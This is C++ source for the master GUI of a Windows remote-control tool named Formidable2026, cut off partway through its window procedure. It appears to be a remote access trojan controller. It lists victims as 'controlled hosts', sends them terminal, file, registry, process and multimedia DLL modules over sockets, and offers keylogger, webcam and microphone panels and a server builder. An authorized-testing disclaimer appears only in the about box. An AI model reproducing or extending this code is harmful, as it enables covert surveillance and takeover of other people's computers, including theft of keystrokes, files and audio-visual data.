#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <ws2tcpip.h>
#include <shellapi.h>
#include <shlobj.h>
#include <commdlg.h>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <map>
#include <memory>
#include <sstream>
#include <ctime>
#include <algorithm>
#include <functional>
#include <fstream>
#include "resource.h"
#include "../Common/Config.h"
#include "../Common/Utils.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "comdlg32.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "advapi32.lib")

using namespace Formidable;

/**
 * Formidable2026 - Master GUI
 * Encoding: UTF-8 BOM
 */

// 自定义消息
#define WM_TRAYICON      (WM_USER + 100)
#define WM_LOC_UPDATE    (WM_USER + 101)

// 窗口控件ID
#define IDC_LIST_CLIENTS 1001
#define IDC_LIST_LOGS    1002
#define IDC_TOOLBAR      1003
#define IDC_STATUSBAR    1004

// 菜单/工具栏命令ID
#define IDM_TERMINAL     2001
#define IDM_PROCESS      2002
#define IDM_WINDOW       2003
#define IDM_DESKTOP      2004
#define IDM_FILE         2005
#define IDM_AUDIO        2006
#define IDM_VIDEO        2007
#define IDM_SERVICE      2008
#define IDM_REGISTRY     2009
#define IDM_KEYLOGGER    2010
#define IDM_SETTINGS     2011
#define IDM_BUILDER      2012
#define IDM_HELP         2013
#define IDM_TRAY_STARTUP 2014
#define IDM_TRAY_RESTART 2015
#define IDM_TRAY_EXIT    2016

struct ConnectedClient {
    SOCKET socket;
    sockaddr_in addr;
    ClientInfo info;
    int listIndex;
    bool active;
    std::mutex sendMutex;
    HWND hProcessDlg; // 进程管理窗口句柄
    HWND hModuleDlg;  // 模块列表窗口句柄
    HWND hTerminalDlg; // 终端管理窗口句柄
    HWND hWindowDlg; // 窗口管理窗口句柄
    HWND hServiceDlg; // 服务管理窗口句柄
    HWND hRegistryDlg; // 注册表管理窗口句柄
    HWND hDesktopDlg; // 桌面管理窗口句柄
    HWND hFileDlg; // 文件管理窗口句柄
    HWND hAudioDlg;
    HWND hVideoDlg;
    HWND hKeylogDlg;
    uint64_t audioBytes;
    uint64_t videoFrames;
    HBITMAP hScreen; // 屏幕监控位图句柄
    std::mutex screenMutex;
    bool isMonitoring;
    uint64_t lastHeartbeatSendTime; // 上次发送心跳的时间
    std::wstring downloadPath; // 当前下载的文件路径
    std::wstring downloadRemoteBase; // 下载时的远程基目录
    std::wstring downloadLocalBase; // 下载时的本地基目录
    std::ofstream downloadFile; // 当前下载的文件流
};

struct ServerSettings {
    int listenPort;
    wchar_t szConfigPath[MAX_PATH];
} g_Settings;

// 全局变量
HINSTANCE g_hInstance;
HANDLE g_hInstanceMutex = NULL;
HWND g_hMainWnd;
HWND g_hListClients;
HWND g_hListLogs;
HWND g_hToolbar;
HWND g_hStatusBar;
std::map<uint32_t, std::shared_ptr<ConnectedClient>> g_Clients;
std::mutex g_ClientsMutex;
uint32_t g_NextClientId = 1;

// 终端专用资源
HFONT g_hTermFont = NULL;
HBRUSH g_hTermEditBkBrush = NULL;

// --- 设置持久化 ---
void LoadSettings() {
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    wchar_t* p = wcsrchr(szPath, L'\\');
    if (p) *(p + 1) = L'\0';
    wcscat_s(szPath, L"config.ini");
    wcscpy_s(g_Settings.szConfigPath, szPath);

    g_Settings.listenPort = GetPrivateProfileIntW(L"Server", L"Port", DEFAULT_PORT, g_Settings.szConfigPath);
}

void SaveSettings() {
    wchar_t szPort[10];
    swprintf_s(szPort, L"%d", g_Settings.listenPort);
    WritePrivateProfileStringW(L"Server", L"Port", szPort, g_Settings.szConfigPath);
}
// 编码转换工具
std::wstring ToWString(const std::string& str) {
    return UTF8ToWide(str);
}
std::wstring ToWString(int val) {
    return std::to_wstring(val);
}
// 函数声明
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void InitListView(HWND hList);
void AddLog(const std::wstring& type, const std::wstring& msg);
void NetworkThread();
void HeartbeatThread();
void HandleClient(uint32_t id, std::shared_ptr<ConnectedClient> client);
void CreateMainMenu(HWND hWnd);
void CreateMainToolbar(HWND hWnd);
void UpdateStatusBar();
void EnsureStartupEnabled();
void RestartMaster(HWND hWnd);
INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK ProcessDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK ModuleDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK TerminalDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK WindowDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK ServiceDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK RegistryDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK DesktopDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK FileDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK AudioDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK VideoDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK KeylogDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
INT_PTR CALLBACK SettingsDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);

// --- 实用工具 ---
bool GetResourceData(int resourceId, std::vector<char>& buffer) {
    HRSRC hRes = FindResourceW(g_hInstance, MAKEINTRESOURCEW(resourceId), L"BIN");
    if (!hRes) return false;
    HGLOBAL hData = LoadResource(g_hInstance, hRes);
    if (!hData) return false;
    DWORD size = SizeofResource(g_hInstance, hRes);
    char* data = (char*)LockResource(hData);
    if (!data) return false;
    buffer.assign(data, data + size);
    return true;
}
int GetResourceIdFromDllName(const std::wstring& dllName, bool is64Bit) {
    if (is64Bit) {
        if (dllName == L"ProcessManager.dll") return IDR_MOD_PROCESS_X64;
        if (dllName == L"SystemInfo.dll") return IDR_MOD_SYSTEM_X64;
        if (dllName == L"Terminal.dll") return IDR_MOD_TERMINAL_X64;
        if (dllName == L"WindowManager.dll") return IDR_MOD_WINDOW_X64;
        if (dllName == L"FileManager.dll") return IDR_MOD_FILE_X64;
        if (dllName == L"ServiceManager.dll") return IDR_MOD_SERVICE_X64;
        if (dllName == L"RegistryManager.dll") return IDR_MOD_REGISTRY_X64;
        if (dllName == L"Multimedia.dll") return IDR_MOD_MULTIMEDIA_X64;
    } else {
        if (dllName == L"ProcessManager.dll") return IDR_MOD_PROCESS_X86;
        if (dllName == L"SystemInfo.dll") return IDR_MOD_SYSTEM_X86;
        if (dllName == L"Terminal.dll") return IDR_MOD_TERMINAL_X86;
        if (dllName == L"WindowManager.dll") return IDR_MOD_WINDOW_X86;
        if (dllName == L"FileManager.dll") return IDR_MOD_FILE_X86;
        if (dllName == L"ServiceManager.dll") return IDR_MOD_SERVICE_X86;
        if (dllName == L"RegistryManager.dll") return IDR_MOD_REGISTRY_X86;
        if (dllName == L"Multimedia.dll") return IDR_MOD_MULTIMEDIA_X86;
    }
    return 0;
}
void AddTrayIcon(HWND hWnd) {
    NOTIFYICONDATAW nid = { 0 };
    nid.cbSize = sizeof(NOTIFYICONDATAW);
    nid.hWnd = hWnd;
    nid.uID = 1;
    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    nid.uCallbackMessage = WM_TRAYICON;
    nid.hIcon = LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_MAIN));
    wcscpy_s(nid.szTip, L"Formidable 2026 - Professional Edition");
    Shell_NotifyIconW(NIM_ADD, &nid);
}
void RemoveTrayIcon(HWND hWnd) {
    NOTIFYICONDATAW nid = { 0 };
    nid.cbSize = sizeof(NOTIFYICONDATAW);
    nid.hWnd = hWnd;
    nid.uID = 1;
    Shell_NotifyIconW(NIM_DELETE, &nid);
}
void EnsureStartupEnabled() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        MessageBoxW(g_hMainWnd, L"无法打开注册表项，设置开机启动失败。", L"错误", MB_OK | MB_ICONERROR);
        return;
    }
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    if (RegSetValueExW(hKey, L"Formidable2026Master", 0, REG_SZ,
        (const BYTE*)exePath, (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t))) == ERROR_SUCCESS) {
        MessageBoxW(g_hMainWnd, L"已为当前用户设置开机自动启动。", L"提示", MB_OK | MB_ICONINFORMATION);
    } else {
        MessageBoxW(g_hMainWnd, L"写入注册表失败，设置开机启动未生效。", L"错误", MB_OK | MB_ICONERROR);
    }
    RegCloseKey(hKey);
}
void RestartMaster(HWND hWnd) {
    if (g_hInstanceMutex) {
        CloseHandle(g_hInstanceMutex);
        g_hInstanceMutex = NULL;
    }
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessW(exePath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        MessageBoxW(hWnd, L"无法重启主控程序。", L"错误", MB_OK | MB_ICONERROR);
        return;
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    PostMessageW(hWnd, WM_CLOSE, 0, 0);
}
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    g_hInstance = hInstance;
    LoadSettings();
    g_hInstanceMutex = CreateMutexW(NULL, TRUE, L"Formidable2026_Master_Instance");
    if (g_hInstanceMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        HWND hExisting = FindWindowW(L"FormidableMasterGUI", NULL);
        if (hExisting) {
            ShowWindow(hExisting, SW_RESTORE);
            SetForegroundWindow(hExisting);
        } else {
            MessageBoxW(NULL, L"已经有一个主控端正在运行了。", L"提示", MB_OK | MB_ICONINFORMATION);
        }
        CloseHandle(g_hInstanceMutex);
        g_hInstanceMutex = NULL;
        return 0;
    }
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_LISTVIEW_CLASSES | ICC_BAR_CLASSES;
    InitCommonControlsEx(&icex);
    WNDCLASSEXW wcex = { 0 };
    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.hInstance = hInstance;
    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wcex.lpszClassName = L"FormidableMasterGUI";
    wcex.hIcon = LoadIconW(hInstance, MAKEINTRESOURCEW(IDI_MAIN));
    RegisterClassExW(&wcex);
    g_hMainWnd = CreateWindowExW(0, L"FormidableMasterGUI", L"Formidable 2026 - Professional Edition", 
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 1100, 800, NULL, NULL, hInstance, NULL);
    if (!g_hMainWnd) return 0;
    ShowWindow(g_hMainWnd, nCmdShow);
    UpdateWindow(g_hMainWnd);
    AddTrayIcon(g_hMainWnd);
    std::thread(NetworkThread).detach();
    std::thread(HeartbeatThread).detach();
    AddLog(L"提示信息", L"主控端已启动，正在监听端口: " + ToWString(DEFAULT_PORT));
    UpdateStatusBar();
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return (int)msg.wParam;
}
void CreateMainMenu(HWND hWnd) {
    HMENU hMenu = CreateMenu();
    HMENU hSubMenu;
    hSubMenu = CreatePopupMenu();
    AppendMenuW(hSubMenu, MF_STRING, 101, L"退出(&X)");
    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, L"菜单(&F)");
    hSubMenu = CreatePopupMenu();
    AppendMenuW(hSubMenu, MF_STRING, IDM_SETTINGS, L"全局设置");
    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, L"工具(&T)");
    hSubMenu = CreatePopupMenu();
    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, L"参数(&P)");
    hSubMenu = CreatePopupMenu();
    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, L"扩展(&X)");
    hSubMenu = CreatePopupMenu();
    AppendMenuW(hSubMenu, MF_STRING, IDM_HELP, L"关于");
    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, L"其他(&H)");
    SetMenu(hWnd, hMenu);
}
void CreateMainToolbar(HWND hWnd) {
    g_hToolbar = CreateWindowExW(0, TOOLBARCLASSNAMEW, NULL,
        WS_CHILD | WS_VISIBLE | TBSTYLE_FLAT | TBSTYLE_TOOLTIPS | CCS_TOP | TBSTYLE_WRAPABLE,
        0, 0, 0, 0, hWnd, (HMENU)IDC_TOOLBAR, g_hInstance, NULL);
    SendMessage(g_hToolbar, TB_BUTTONSTRUCTSIZE, (WPARAM)sizeof(TBBUTTON), 0);
    SendMessage(g_hToolbar, TB_SETBITMAPSIZE, 0, MAKELPARAM(32, 32));
    HIMAGELIST hImageList = ImageList_Create(32, 32, ILC_COLOR32 | ILC_MASK, 13, 1);
    SendMessage(g_hToolbar, TB_SETIMAGELIST, 0, (LPARAM)hImageList);
    // 加载科技风图标资源
    int iconIds[] = { 
        IDI_TERMINAL, IDI_PROCESS, IDI_WINDOW, IDI_DESKTOP, IDI_FILE, 
        IDI_AUDIO, IDI_VIDEO, IDI_SERVICE, IDI_REGISTRY, IDI_KEYLOGGER, 
        IDI_SETTINGS, IDI_BUILDER, IDI_HELP 
    };
    for (int i = 0; i < 13; i++) {
        HICON hIcon = (HICON)LoadImageW(g_hInstance, MAKEINTRESOURCEW(iconIds[i]), IMAGE_ICON, 32, 32, LR_DEFAULTCOLOR);
        ImageList_AddIcon(hImageList, hIcon);
        DestroyIcon(hIcon);
    }
    const wchar_t* buttonTexts[] = { 
        L"终端管理", L"进程管理", L"窗口管理", L"桌面管理", L"文件管理", 
        L"语音管理", L"视频管理", L"服务管理", L"注册表管理", L"键盘记录", 
        L"参数设置", L"生成服务端", L"帮助" 
    };
    int ids[] = { 
        IDM_TERMINAL, IDM_PROCESS, IDM_WINDOW, IDM_DESKTOP, IDM_FILE, 
        IDM_AUDIO, IDM_VIDEO, IDM_SERVICE, IDM_REGISTRY, IDM_KEYLOGGER, 
        IDM_SETTINGS, IDM_BUILDER, IDM_HELP 
    };
    TBBUTTON tbButtons[13];
    for (int i = 0; i < 13; i++) {
        ZeroMemory(&tbButtons[i], sizeof(TBBUTTON));
        tbButtons[i].iBitmap = i;
        tbButtons[i].idCommand = ids[i];
        tbButtons[i].fsState = TBSTATE_ENABLED;
        tbButtons[i].fsStyle = BTNS_AUTOSIZE | BTNS_SHOWTEXT;
        tbButtons[i].iString = (INT_PTR)buttonTexts[i];
    }
    SendMessage(g_hToolbar, TB_ADDBUTTONS, 13, (LPARAM)&tbButtons);
    SendMessage(g_hToolbar, TB_AUTOSIZE, 0, 0);
}
void UpdateStatusBar() {
    std::wstring status = L" 有 " + ToWString((int)g_Clients.size()) + L" 个主机在线";
    SendMessageW(g_hStatusBar, SB_SETTEXTW, 0, (LPARAM)status.c_str());
}
void ShowAboutDialog(HWND hWnd) {
    MessageBoxW(hWnd, L"Formidable 2026 Professional Edition\n\n版本: 2026.1.0\n开发者: 柯南jimmy\n仅供技术研究与授权测试使用。", L"关于 Formidable 2026", MB_OK | MB_ICONINFORMATION);
}
// 获取当前选中的客户端 ID
int GetSelectedClientId() {
    int index = ListView_GetNextItem(g_hListClients, -1, LVNI_SELECTED);
    if (index == -1) return -1;
    LVITEMW lvi = { 0 };
    lvi.mask = LVIF_PARAM;
    lvi.iItem = index;
    if (ListView_GetItem(g_hListClients, &lvi)) {
        return (int)lvi.lParam;
    }
    return -1;
}
// 向被控端发送功能模块 DLL (支持跨架构从磁盘加载，方便调试)
bool SendModuleToClient(uint32_t clientId, uint32_t cmd, const std::wstring& dllName, uint32_t arg2 = 0) {
    std::shared_ptr<ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (g_Clients.count(clientId)) client = g_Clients[clientId];
    }
    if (!client) return false;

    std::vector<char> dllData;
    
    // 1. 尝试从磁盘加载 (支持跨架构加载调试模块)
    wchar_t szExePath[MAX_PATH];
    GetModuleFileNameW(NULL, szExePath, MAX_PATH);
    std::wstring masterDir = szExePath;
    size_t lastSlash = masterDir.find_last_of(L"\\/");
    masterDir = masterDir.substr(0, lastSlash + 1);

    // 尝试在主控端同级目录或其 x64/x86 子目录下查找
    std::vector<std::wstring> searchPaths;
    // 根据客户端架构决定搜索路径
    if (client->info.is64Bit) {
        searchPaths.push_back(masterDir + L"x64\\" + dllName);
        searchPaths.push_back(masterDir + L"Formidable2026\\x64\\" + dllName);
    } else {
        searchPaths.push_back(masterDir + L"x86\\" + dllName);
        searchPaths.push_back(masterDir + L"Formidable2026\\x86\\" + dllName);
    }
    searchPaths.push_back(masterDir + dllName); // 兜底：当前目录

    for (const auto& dllPath : searchPaths) {
        HANDLE hFile = CreateFileW(dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            if (fileSize > 0) {
                dllData.resize(fileSize);
                DWORD bytesRead;
                if (ReadFile(hFile, dllData.data(), fileSize, &bytesRead, NULL) && bytesRead == fileSize) {
                    AddLog(L"调试", L"已从磁盘加载 [" + std::wstring(client->info.is64Bit ? L"x64" : L"x86") + L"] 模块: " + dllName);
                    CloseHandle(hFile);
                    goto data_ready;
                }
            }
            CloseHandle(hFile);
        }
    }

    // 2. 如果磁盘没有，从资源加载
    if (dllData.empty()) {
        int resId = GetResourceIdFromDllName(dllName, client->info.is64Bit != 0);
        if (resId == 0) {
            AddLog(L"错误", L"未找到匹配架构的模块资源: " + dllName);
            return false;
        }
        if (!GetResourceData(resId, dllData)) {
            AddLog(L"错误", L"无法从资源中读取模块数据: " + dllName);
            return false;
        }
    }

data_ready:
    size_t fileSize = dllData.size();
    size_t bodySize = sizeof(CommandPkg) - 1 + fileSize;
    std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
    
    PkgHeader* header = (PkgHeader*)buffer.data();
    memcpy(header->flag, "FRMD26?", 7);
    header->originLen = (int)bodySize;
    header->totalLen = (int)buffer.size();
    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = (uint32_t)fileSize;
    pkg->arg2 = arg2;
    memcpy(pkg->data, dllData.data(), fileSize);
    std::lock_guard<std::mutex> lock(client->sendMutex);
    int sent = send(client->socket, buffer.data(), (int)buffer.size(), 0);
    return sent > 0;
}
bool SendSimpleCommand(uint32_t clientId, uint32_t cmd, uint32_t arg1 = 0, uint32_t arg2 = 0, const std::string& data = "") {
    std::shared_ptr<ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (g_Clients.count(clientId)) client = g_Clients[clientId];
    }
    if (!client) return false;
    size_t bodySize = sizeof(CommandPkg) - 1 + data.size();
    std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
    PkgHeader* header = (PkgHeader*)buffer.data();
    memcpy(header->flag, "FRMD26?", 7);
    header->originLen = (int)bodySize;
    header->totalLen = (int)buffer.size();
    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = arg1;
    pkg->arg2 = arg2;
    if (!data.empty()) {
        memcpy(pkg->data, data.data(), data.size());
    }
    std::lock_guard<std::mutex> lock(client->sendMutex);
    int sent = send(client->socket, buffer.data(), (int)buffer.size(), 0);
    return sent > 0;
}
// 处理菜单和工具栏命令
void HandleCommand(HWND hWnd, int id) {
    if (id == 101) { // 退出
        DestroyWindow(hWnd);
        return;
    }
    if (id == IDM_HELP) {
        ShowAboutDialog(hWnd);
        return;
    }
    if (id == IDM_TRAY_EXIT) {
        DestroyWindow(hWnd);
        return;
    }
    if (id == IDM_TRAY_STARTUP) {
        EnsureStartupEnabled();
        return;
    }
    if (id == IDM_TRAY_RESTART) {
        RestartMaster(hWnd);
        return;
    }
    // 检查是否选中了被控端 (除了设置和生成器等全局功能)
    int clientId = -1;
    if (id != IDM_SETTINGS && id != IDM_BUILDER) {
        clientId = GetSelectedClientId();
        if (clientId == -1) {
            AddLog(L"提示", L"请先在列表中选中一个被控端主机！");
            MessageBoxW(hWnd, L"请先在列表中选中一个被控端主机后再进行操作。", L"提示", MB_OK | MB_ICONWARNING);
            return;
        }
    }
    switch (id) {
    case IDM_TERMINAL:
        {
            std::shared_ptr<ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hTerminalDlg && IsWindow(client->hTerminalDlg)) {
                    ShowWindow(client->hTerminalDlg, SW_SHOW);
                    SetForegroundWindow(client->hTerminalDlg);
                } else {
                    client->hTerminalDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_TERMINAL), hWnd, TerminalDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hTerminalDlg, SW_SHOW);
                    
                    AddLog(L"系统", L"正在加载终端管理模块...");
                    SendModuleToClient(clientId, CMD_TERMINAL_OPEN, L"Terminal.dll");
                }
            }
        }
        break;
    case IDM_PROCESS:
        {
            std::shared_ptr<ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hProcessDlg && IsWindow(client->hProcessDlg)) {
                    ShowWindow(client->hProcessDlg, SW_SHOW);
                    SetForegroundWindow(client->hProcessDlg);
                } else {
                    client->hProcessDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_PROCESS), hWnd, ProcessDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hProcessDlg, SW_SHOW);
                    
                    AddLog(L"系统", L"正在加载进程管理模块...");
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"ProcessManager.dll", CMD_PROCESS_LIST);
                }
            }
        }
        break;
    case IDM_WINDOW:
        {
            std::shared_ptr<ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hWindowDlg && IsWindow(client->hWindowDlg)) {
                    ShowWindow(client->hWindowDlg, SW_SHOW);
                    SetForegroundWindow(client->hWindowDlg);
                } else {
                    client->hWindowDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_WINDOW), hWnd, WindowDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hWindowDlg, SW_SHOW);
                    
                    AddLog(L"系统", L"正在加载窗口管理模块...");
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"WindowManager.dll", CMD_WINDOW_LIST);
                }
            }
        }
        break;
    case IDM_FILE:
        {
            std::shared_ptr<ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hFileDlg && IsWindow(client->hFileDlg)) {
                    ShowWindow(client->hFileDlg, SW_SHOW);
                    SetForegroundWindow(client->hFileDlg);
                } else {
                    client->hFileDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_FILE), hWnd, FileDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hFileDlg, SW_SHOW);
                    
                    AddLog(L"系统", L"正在加载文件管理模块...");
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"FileManager.dll", CMD_FILE_LIST);
                }
            }
        }
        break;
    case IDM_DESKTOP:
        {
            std::shared_ptr<ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hDesktopDlg && IsWindow(client->hDesktopDlg)) {
                    ShowWindow(client->hDesktopDlg, SW_SHOW);
                    SetForegroundWindow(client->hDesktopDlg);
                } else {
                    client->hDesktopDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_DESKTOP), hWnd, DesktopDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hDesktopDlg, SW_SHOW);
                    
                    AddLog(L"系统", L"正在加载桌面管理模块...");
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"Multimedia.dll");
                }
            }
        }
        break;
    case IDM_VIDEO:
        {
            std::shared_ptr<ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hVideoDlg && IsWindow(client->hVideoDlg)) {
                    ShowWindow(client->hVideoDlg, SW_SHOW);
                    SetForegroundWindow(client->hVideoDlg);
                } else {
                    client->hVideoDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_VIDEO), hWnd, VideoDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hVideoDlg, SW_SHOW);
                }
            }
        }
        break;
    case IDM_AUDIO:
        {
            std::shared_ptr<ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hAudioDlg && IsWindow(client->hAudioDlg)) {
                    ShowWindow(client->hAudioDlg, SW_SHOW);
                    SetForegroundWindow(client->hAudioDlg);
                } else {
                    client->hAudioDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_AUDIO), hWnd, AudioDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hAudioDlg, SW_SHOW);
                }
            }
        }
        break;
    case IDM_REGISTRY:
        {
            std::shared_ptr<ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hRegistryDlg && IsWindow(client->hRegistryDlg)) {
                    ShowWindow(client->hRegistryDlg, SW_SHOW);
                    SetForegroundWindow(client->hRegistryDlg);
                } else {
                    client->hRegistryDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_REGISTRY), hWnd, RegistryDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hRegistryDlg, SW_SHOW);
                    
                    AddLog(L"系统", L"正在加载注册表管理模块...");
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"RegistryManager.dll", CMD_REGISTRY_CTRL);
                }
            }
        }
        break;
    case IDM_SERVICE:
        {
            std::shared_ptr<ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hServiceDlg && IsWindow(client->hServiceDlg)) {
                    ShowWindow(client->hServiceDlg, SW_SHOW);
                    SetForegroundWindow(client->hServiceDlg);
                } else {
                    client->hServiceDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_SERVICE), hWnd, ServiceDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hServiceDlg, SW_SHOW);
                    
                    AddLog(L"系统", L"正在加载服务管理模块...");
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"ServiceManager.dll", CMD_SERVICE_LIST);
                }
            }
        }
        break;
    case IDM_KEYLOGGER:
        {
            std::shared_ptr<ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hKeylogDlg && IsWindow(client->hKeylogDlg)) {
                    ShowWindow(client->hKeylogDlg, SW_SHOW);
                    SetForegroundWindow(client->hKeylogDlg);
                } else {
                    client->hKeylogDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_KEYLOGGER), hWnd, KeylogDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hKeylogDlg, SW_SHOW);
                }
            }
        }
        break;
    case IDM_SETTINGS:
        DialogBoxW(g_hInstance, MAKEINTRESOURCEW(IDD_SETTINGS), hWnd, SettingsDlgProc);
        break;
    case IDM_BUILDER:
        DialogBoxW(g_hInstance, MAKEINTRESOURCEW(IDD_BUILDER), hWnd, BuilderDlgProc);
        break;
    default:
        break;
    }
}
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_CREATE: {
        CreateMainMenu(hWnd);
        CreateMainToolbar(hWnd);
        
